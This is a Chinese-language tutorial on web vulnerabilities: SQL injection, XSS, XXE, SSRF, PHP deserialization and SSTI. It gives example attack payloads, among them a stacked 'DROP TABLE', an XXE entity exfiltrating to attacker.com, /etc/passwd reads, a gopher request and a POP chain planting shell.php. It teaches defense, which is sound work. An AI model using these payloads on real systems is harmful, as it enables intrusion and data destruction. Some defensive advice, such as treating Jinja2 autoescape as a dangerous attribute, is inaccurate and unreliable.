### 一、SQL注入

**核心内容**：  
构造恶意SQL语句，绕过应用过滤即骗过网站的防御机制，获取数据库敏感信息或执行命令。

#### 四种注入类型

1. **联合注入（UNION注入）**  

   - **原理**：UNION 的意思是“联合、合并”，攻击者利用这个操作，将恶意要求放在正常信息后面，从而进行攻击。

   - **利用场景**：页面有数据回显（如显示用户信息，获取密码）。  

   - **示例**：
   `id=1 UNION SELECT 1,2,database()--`  

  注：（`database()`获取当前数据库名）。 ‘--’是注释掉语句的意思，这样避免报错，顺利进行攻击。  

- **防御**：用参数化查询（如PDO的`prepare`）代替字符串拼接，避免直接拼接用户输入，相当于不让攻击者自己生成指令单。  

1. **报错注入**

   - **原理**：故意构造违反SQL语法的乱码公式，迫使数据库崩溃报错并输出敏感数据（如`updatexml`、`extractvalue`）。  

   - **利用场景**：不显示正常的查询内容，但有具体的错误提示（如“SQL syntax error”）。

   - **示例**：`id=1' and updatexml(1,concat(0x7e,user()),1)--`

   （`user()`获取当前用户名）。
    攻击者输入“查订单号1，顺便塞个算不出来的乱码公式，公式里藏着获取管理员名字的指令”——电脑报错时，直接输出管理员名字。  

   - **防御**：禁用错误信息（如MySQL的`sql_mode`），避免输出具体的报错原因。

2. **盲注**

   - **原理**：通过页面状态（布尔盲注）或时间延迟（时间盲注）这两个方法推断出机密数据。

   - **利用场景**：无任何回显（如登录页面），既不显示查询的数据也不报错。

   - **示例（时间盲注）**：  
   `id=1' AND IF(ascii(substr(database(),1,1))=115,sleep(3),0)--`  

   示例的意思：（如果数据库名首字母是's'，网页会延迟3秒再刷新），如果真的延迟了三秒，那么证明攻击者猜对了。

   - **防御**：限制查询时间（如MySQL的`max_execution_time`），避免长时间执行。

3. **堆叠注入**  
   - **原理**：用分号`;`拼接多条SQL语句，执行多个命令。

   - **利用场景**：支持多语句执行，相当于一次性接受多条指令。  

   - **示例**：`id=1; DROP TABLE users--`  

     （删除`users`表）。  

   - **防御**：禁用多语句执行（如PHP的`mysql_multi_query`），只允许单语句查询。  

### 二、XSS与XXE  

**核心内容**：XSS是攻击者向电脑里注入恶意代码，让浏览器自动执行恶意命令。  
XXE是注入外部实体，让电脑的系统自动执行恶意操作。  

#### 详细解析  

1. **XSS（跨站脚本攻击）**

   - **类型**：  

     - **存储型**：恶意脚本存入数据库（如留言板），用户访问时执行。  

     - **反射型**：恶意脚本附在URL中（如`?msg=<script>alert(1)</script>`），服务器原样返回。

     - **DOM型**：纯前端DOM结构修改（如`javascript:alert(1)`），不经过服务器。  
       即直接在你的浏览器里修改内容。

     - **利用场景**：窃取Cookie、劫持会话、钓鱼攻击。  
     注：具体解释在前几篇有。

   - **防御**：

     - 输出时编码（如HTML实体编码：`<`→`&lt;`）；即将一些特殊符号编写成别的样子，浏览器会将其认为是普通文字。

     - CSP（内容安全策略）限制脚本来源；禁止执行未知的来源脚本。

     - HttpOnly Cookie防止JavaScript读取。注：相当于给加了个安全锁

2. **XXE（XML外部实体注入）**

   - **原理**：XML解析器是一种文件处理工具，攻击者提交解析XML时，电脑的XML未禁用外部实体加载，导致读取本地文件或发起网络请求，攻击者就达到了攻击的目的。  
  
   - **利用场景**：

     - **带外通信（OOB）**：`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>`，将数据外带。  

     - **内网探测**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`，读取本地敏感文件。

   - **防御**：

     - 禁用外部实体（如PHP的`libxml_disable_entity_loader(true)`）；

     - 限制XML解析器的功能（如`XMLParser`的`setOption(XMLParser::DISALLOW_FILE)`）。

### 三、SSRF（服务端请求伪造）  

**核心内容**：攻击者利用 ‘服务器’ 发起请求，绕过防火墙，访问内网资源。  

#### 详细解析  

- **原理**：攻击者构造URL，相当于在一个可填网址的地方**故意**填一个内网网址，让服务器发起请求（如`http://internal-server`），绕过外部防火墙，获取内网信息。

- **利用场景**：   

  1. **内网探测**：扫描内网IP（如`http://192.168.1.1`），获取存活主机和服务端口。   

  2. **读取本地文件**：利用协议（如`file:///etc/passwd`）读取服务器敏感文件。  
  注：file 属于特殊指令。  

  3. **高阶攻击**：结合`dict://`、`gopher://`等协议，发送定制化TCP数据包，执行系统命令。  
  （如`gopher://127.0.0.1:80/_POST /shell.php HTTP/1.1...`）。  

- **防御**：  
  - **限制**请求协议（如只允许`http`/`https`，禁止`file`/`dict`）；  

  - 验证URL域名，即只允许访问白名单上网址（如白名单限制为`example.com`）；    
       
  - 使用`curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, 'http,https')`限制重定向协议。   
  即如果服务器在访问过程中被要求“跳转”到其他网址，只允许它跳转到用http或https协议的地方.
  

### 四、反序列化漏洞  

**核心内容**：用户可控的<span title="把一个复杂的PHP对象（比如一个用户信息对象）转换成一种特定格式的字符串，方便存储到数据库或通过网络传输">序列化字符串，触发"魔术"方法（如`__wakeup`、`__destruct`），执行恶意代码。  

#### 详细解析  

- **原理**：`unserialize()`过程中，即<span title="把序列化后的字符串“还原”成原来的PHP对象">反序列化过程，系统自动调用魔术方法，如果反序列化的数据是用户可以控制的,攻击者可以构造一串序列化字符串，即构造POP链（属性导向编程）执行恶意命令。    

- **利用场景**：   

  - PHP的`unserialize()`函数（如`unserialize($_GET['data'])`）。   
   <用户提交的数据被直接丢给系统的`unserialize()` 去处理>  

  - 示例POP链：`O:4:"User":2:{s:8:"username";s:5:"admin";s:12:"__destruct";a:1:{i:0;O:6:"Logger":1:{s:8:"log_file";s:10:"shell.php";}}}`  
    
  （`__destruct`触发`Logger`的`log_file`属性，写入`shell.php`）。      
   这是一串较长的作用链。  
   通俗解释：“这是一个叫User的包裹，里面存在一个名叫__destruct的‘销毁触发器’；当系统销毁这个包裹时，会触发连锁反应，去调用一个叫Logger（日志工具）的功能，并把它的目标文件设为shell.php。” 后面系统拆包时刚好中计，攻击者就能借此控制服务器了。

- **防御**：   

  - 禁用`unserialize()`（如PHP的`disable_functions`）；  

  - 用JSON代替序列化（如`json_decode`，无魔术方法）；   

  - 验证序列化数据（如检查类名、属性值是否符合预期）。  

### 五、SSTI（服务端模板注入）

**核心内容**：模板引擎解析用户输入，执行恶意代码。  

#### 详细解析  

- **原理**：Web框架的模板引擎（如Python的Jinja2）动态渲染页面时，错误地将用户输入作为模板语法执行。  

- **利用场景**：    

  - **Jinja2**：利用魔术属性（`__class__`、`__mro__`）获取基类，调用`os.popen`或`subprocess`执行命令。    

  - **示例Payload**：`{{ ''.__class__.__mro__[2].__subclasses__()[40]('ls -la').read() }}`  
    
    （获取`subprocess.Popen`类，执行`ls -la`）。    
    通俗解释：从空字符串开始 '' -> 查出它属于什么类别 __class__ -> 找到它的源头基类 __mro__ -> 翻出源头都留下了什么__subclasses__() -> 拿出第40号 一个能执行系统命令的工具 -> 让它执行 ls -la（列出当前目录所有文件） -> 获得最终结果
  
- **防御**：    

  - 禁用模板引擎的危险属性（如Jinja2的`autoescape`）；    

  - 限制模板语法（如只允许变量，禁止方法调用）；    

  - 用沙箱环境（如Docker）隔离模板执行。  

### 总结：五大漏洞的“攻防逻辑”  

| 漏洞类型 | 攻击核心 | 防御核心 |  
| ---------- | ---------- | ---------- |  
| SQL注入 | 构造恶意SQL语句 | 参数化查询、输入过滤 |  
| XSS/XXE | 注入脚本/实体 | 输出编码、禁用外部实体 |  
| SSRF | 服务器发起请求 | 限制协议、验证URL |  
| 反序列化 | 触发魔术方法 | 禁用`unserialize`、验证数据 |  
| SSTI | 模板引擎执行代码 | 限制模板语法、沙箱隔离 |  

如何防御： 数据与指令分离（用户填的永远是“值”，永远不能变成“查询动作”）  
给数据消毒降级（让恶意代码失去“执行力”，变成纯文本）  
划定牢笼边界（就算恶意代码被执行了也无法进入核心地界）
